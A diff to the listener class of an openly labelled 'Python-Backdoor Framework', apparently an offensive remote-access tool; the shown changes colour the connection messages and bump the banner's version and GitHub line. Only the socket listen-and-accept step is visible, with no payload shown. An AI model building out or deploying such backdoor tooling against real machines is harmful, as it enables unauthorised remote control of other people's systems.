@@ -25,9 +25,9 @@ class server_backdoor:
             listener.bind((ip, port))
             listener.listen(0)
 
-            print("[+] Waiting for connections.")
+            print("{}[+] Waiting for connections.{}".format(Fore.CYAN, Fore.WHITE))
             self.connection, address = listener.accept()
-            print("[+] Got a connection from {}".format(address))
+            print("{}[+] Got a connection from {}{}".format(Fore.GREEN, address, Fore.WHITE))
         except Exception as e:
             print("Error connecting: {}".format(e))
 
@@ -42,8 +42,8 @@ class server_backdoor:
         \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                 (Python-Backdoor Framework)
 
-                                Vesion 1.1
-                                Author: Noam
+                                Vesion 1.2
+                                Github: https://github.com/NoamHarush/                                
                                                         {}\n\n""".format(Fore.BLUE, Fore.WHITE))
                 
         except Exception as e:
